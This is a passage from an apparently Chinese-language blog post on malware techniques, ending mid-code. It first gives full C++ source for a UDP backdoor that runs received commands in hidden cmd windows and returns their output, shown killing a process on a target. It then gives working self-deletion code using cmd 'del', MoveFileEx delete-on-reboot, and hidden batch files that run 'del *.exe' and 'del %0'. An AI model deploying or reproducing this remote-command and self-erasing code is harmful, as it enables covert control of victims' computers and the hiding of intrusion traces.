<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line">SOCKET SktUDP;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySendMessage</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort,<span class="keyword">char</span> *message,<span class="keyword">int</span> sizeofmessage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    addr.sin_family = AF_INET;</span><br><span class="line">    addr.sin_port = htons(iPort);</span><br><span class="line">    addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">    </span><br><span class="line">    out = sendto(SktUDP, message, sizeofmessage, <span class="number">0</span>, (sockaddr*)&amp;addr, addr_len);</span><br><span class="line">    <span class="keyword">if</span> (out == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, WSAGetLastError());</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyRemoteCmd</span><span class="params">(<span class="keyword">char</span>* lpCommandLine, <span class="keyword">char</span>* buffer, DWORD buffersize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE  hReadPipe = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE  hWritePipe = <span class="literal">NULL</span>;</span><br><span class="line">    SECURITY_ATTRIBUTES securityattributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    STARTUPINFOA si = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置SECURITY_ATTRIBUTES结构体属性。</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//大小</span></span><br><span class="line">    securityattributes.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">    <span class="comment">//可被创建的新进程继承句柄。</span></span><br><span class="line">    securityattributes.bInheritHandle = TRUE;</span><br><span class="line">    securityattributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityattributes, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreatePipe Failed!!! %d&quot;</span>, GetLastError());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">    ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">    si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">    <span class="comment">//隐藏窗口</span></span><br><span class="line">    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<span class="comment">//STARTF_USESTDHANDLES这个代表指定是进程的标准输入输出句柄</span></span><br><span class="line">    si.wShowWindow = SW_HIDE;</span><br><span class="line">    <span class="comment">//设置输出句柄和标准错误句柄</span></span><br><span class="line">    si.hStdOutput = hWritePipe;</span><br><span class="line">    si.hStdError = hWritePipe;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置为继承句柄，将返回数据写入管道</span></span><br><span class="line">    <span class="keyword">if</span> (CreateProcessA(<span class="number">0</span>, lpCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//等待子进程结束</span></span><br><span class="line">    WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">    WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//利用ReadFile读取管道数据，CreatePipe函数的评论也讲到利用ReadFile来读取数据</span></span><br><span class="line">    ReadFile(hReadPipe, buffer, buffersize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//关闭句柄 </span></span><br><span class="line">    CloseHandle(pi.hProcess);</span><br><span class="line">    CloseHandle(pi.hThread);</span><br><span class="line">    CloseHandle(hWritePipe);</span><br><span class="line">    CloseHandle(hReadPipe);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//fu 127.0.0.1 2333  ke 127.0.0.1 1234</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc_recvform</span><span class="params">(LPVOID lpParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接受连接请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> message[<span class="number">0x5000</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sockaddr_in addr = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> addr_len = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">        <span class="keyword">int</span> out = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(message, <span class="number">0</span>, <span class="keyword">sizeof</span>(message));</span><br><span class="line">        <span class="comment">//接收信息</span></span><br><span class="line">        out = recvfrom(SktUDP, message, <span class="number">0x5000</span>, <span class="number">0</span>, (sockaddr*)&amp;addr, &amp;addr_len);</span><br><span class="line">        <span class="keyword">if</span> (out &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv from :%s\n&quot;</span>, message);</span><br><span class="line">        <span class="comment">//当接受到的消息的长度小于默认认为是cmd命令</span></span><br><span class="line">        <span class="keyword">if</span> (out &lt; <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> cmd[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            <span class="keyword">char</span> szBuffer[<span class="number">0x5000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">            DWORD dwBufferSize = <span class="number">0x5000</span>;</span><br><span class="line">            <span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, dwBufferSize);</span><br><span class="line">            <span class="built_in">strcpy</span>(cmd, message);</span><br><span class="line">            <span class="keyword">if</span> (MyRemoteCmd(cmd, szBuffer, dwBufferSize) == FALSE)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//cmd命令不正常跳过发送命令</span></span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">strlen</span>(szBuffer))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//提前设置好发送消息的端口</span></span><br><span class="line">                MySendMessage(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">2333</span>, szBuffer, <span class="built_in">strlen</span>(szBuffer));</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MySktUDP</span><span class="params">(LPCSTR sIP, <span class="keyword">int</span> iPort)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//WSAStartup初始化</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//socket 创建套接字</span></span><br><span class="line">    SktUDP = socket(AF_INET, SOCK_DGRAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (SktUDP == INVALID_SOCKET)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//配置服务器信息</span></span><br><span class="line">    sockaddr_in server_addr;</span><br><span class="line">    server_addr.sin_family = AF_INET;</span><br><span class="line">    server_addr.sin_port = htons(iPort);</span><br><span class="line">    server_addr.sin_addr.S_un.S_addr = inet_addr(sIP);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//绑定服务器</span></span><br><span class="line">    <span class="keyword">if</span> (bind(SktUDP, (<span class="keyword">const</span> sockaddr*)&amp;server_addr, <span class="keyword">sizeof</span>(server_addr)) == SOCKET_ERROR)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind Failed!!!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//创建线程来接收消息</span></span><br><span class="line">    CreateThread(<span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)ThreadProc_recvform, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> sIP[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">int</span> iPort = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input IP and Port:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">if</span> (MySktUDP(sIP, iPort))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind success!!!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input Dest IP and Dest Port:\n&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s%d&quot;</span>, sIP, &amp;iPort);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//输入信息，发送信息</span></span><br><span class="line">        <span class="keyword">char</span> message[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        gets_s(message, MAX_PATH);</span><br><span class="line">        MySendMessage(sIP, iPort, message,<span class="built_in">strlen</span>(message));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是也有不好的地方，就是对于命令返回数据过多的的时候会崩掉，主要是设置的空间有限，UDP的单次传输大小好像也有个上限，但是对于普通的命令还是没什么问题，而且能够执行的命令有限不能启动exe文件，不然会导致命令接收端卡住。</p>
<p>下面是测试结果，关闭目标电脑上的notepad.exe，dos命令taskkill /f /im notepad.exe /t<br><img src="https://s2.loli.net/2022/01/21/UOJ5GsiSMtldue3.png"></p>
<h3 id="自删除"><a href="#自删除" class="headerlink" title="自删除"></a>自删除</h3><p>之前分析一个样本见到的，利用cmd命令删除，/c del filename &gt;&gt; NUL。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CHAR Filename[<span class="number">260</span>];</span><br><span class="line">	CHAR Parameters[<span class="number">260</span>];</span><br><span class="line"></span><br><span class="line">	GetModuleFileNameA(<span class="number">0</span>, Filename, <span class="number">0x104</span>u);</span><br><span class="line">	GetShortPathNameA(Filename, Filename, <span class="number">0x104</span>u);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Filename);</span><br><span class="line">	<span class="built_in">strcpy</span>(Parameters, <span class="string">&quot;/c del &quot;</span>);</span><br><span class="line">	<span class="built_in">strcat</span>(Parameters, Filename);</span><br><span class="line">	<span class="built_in">strcat</span>(Parameters, <span class="string">&quot; &gt;&gt; NUL&quot;</span>);</span><br><span class="line">	ShellExecuteA(<span class="number">0</span>, <span class="number">0</span>, <span class="string">&quot;cmd.exe&quot;</span>, Parameters, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用MoveFileEx函数实现。</p>
<pre><code>BOOL MoveFileExA(
  [in]           LPCSTR lpExistingFileName,
  [in, optional] LPCSTR lpNewFileName,
  [in]           DWORD  dwFlags
);</code></pre>
<p>如果dwFlags指定MOVEFILE_DELAY_UNTIL_REBOOT并且 lpNewFileName为 NULL， 则MoveFileEx注册 lpExistingFileName文件以在系统重新启动时删除。</p>
<p>注意点：在此函数的 ANSI 版本中，名称仅限于MAX_PATH字符。要将此限制扩展到 32,767 个宽字符，请调用函数的 Unicode 版本并在前面加上“?” 到路径。有关详细信息，请参阅 命名文件</p>
<p>提示  从 Windows 10 版本 1607 开始，对于此函数的 unicode 版本 ( MoveFileExW )，您可以选择加入以删除MAX_PATH限制，而无需预先添加“\?\”。有关详细信息，请参阅命名文件、路径和命名空间的“最大路径长度限制”部分。</p>
<p>对于文件 I/O，路径字符串的“\?\”前缀告诉 Windows API 禁用所有字符串解析并将其后面的字符串直接发送到文件系统。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">test2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CHAR Filename[MAX_PATH];</span><br><span class="line">	CHAR szTemp[MAX_PATH] = <span class="string">&quot;\\\\?\\&quot;</span>;</span><br><span class="line"></span><br><span class="line">	GetModuleFileName(<span class="number">0</span>, Filename, MAX_PATH);</span><br><span class="line">	<span class="built_in">strcat</span>(szTemp, Filename);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, szTemp);</span><br><span class="line">	BOOL Ret= MoveFileEx(szTemp, <span class="literal">NULL</span>, MOVEFILE_DELAY_UNTIL_REBOOT);</span><br><span class="line">	<span class="keyword">if</span> (Ret == FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后当然我去执行代码去发现报错，GetLastError的值为5，无法访问，意思就是权限不够。然后我又去读了官方文档的评论。</p>
<pre><code>如果dwFlags参数指定 MOVEFILE_DELAY_UNTIL_REBOOT， 则如果无法访问注册表，则MoveFileEx将失败。该函数将重新启动时要重命名的文件的位置存储在以下注册表值中： HKEY_LOCAL_MACHINE \ SYSTEM \ CurrentControlSet \ Control \ Session Manager \ PendingFileRenameOperations

此注册表值属于REG_MULTI_SZ类型。每个重命名操作都存储以下以 NULL 结尾的字符串之一，具体取决于重命名是否为删除：

szDstFile \0\0
szSrcFile \0 szDstFile \0
字符串szDstFile \0\0 表示文件 szDstFile将在重新启动时被删除。字符串 szSrcFile \0 szDstFile \0 表示 szSrcFile将在重新启动时重命名为szDstFile。</code></pre>
<p>所以这个函数的本质是修改注册表相关位置，然后在重新启动时，进行删除操作。</p>
<p>接下来我们以管理员身份启动该程序，然后去查看注册表相关位置。<br><img src="https://s2.loli.net/2022/01/21/67jnkuCmIhoB3vz.png"><br>然后如果重新启动计算机，就会发现这个exe不见了。</p>
<p>还有种方法就是批处理了，实际上就和第一种差不多，只不过是写成了bat文件，然后CreateProcess函数隐藏窗口执行bat文件。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateChoiceBat</span><span class="params">(<span class="keyword">char</span> *pszBatFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iTime = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> szBat[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构造批处理内容</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		@echo off</span></span><br><span class="line"><span class="comment">		choice /t 5 /d y /n &gt;nul</span></span><br><span class="line"><span class="comment">		del *.exe</span></span><br><span class="line"><span class="comment">		del %0</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	::wsprintf(szBat, <span class="string">&quot;@echo off\nchoice /t %d /d y /n &gt;nul\ndel *.exe\ndel %%0\n&quot;</span>, iTime);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 生成批处理文件</span></span><br><span class="line">	FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">	fopen_s(&amp;fp, pszBatFileName, <span class="string">&quot;w+&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == fp)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	fwrite(szBat, (<span class="number">1</span> + ::lstrlen(szBat)), <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreatePingBat</span><span class="params">(<span class="keyword">char</span> *pszBatFileName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> iTime = <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">char</span> szBat[MAX_PATH] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 构造批处理内容</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		@echo off</span></span><br><span class="line"><span class="comment">		ping 127.0.0.1 -n 5</span></span><br><span class="line"><span class="comment">		del *.exe</span></span><br><span class="line"><span class="comment">		del %0</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	::wsprintf(szBat, <span class="string">&quot;@echo off\nping 127.0.0.1 -n %d\ndel *.exe\ndel %%0\n&quot;</span>, iTime);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 生成批处理文件</span></span><br><span class="line">	FILE *fp = <span 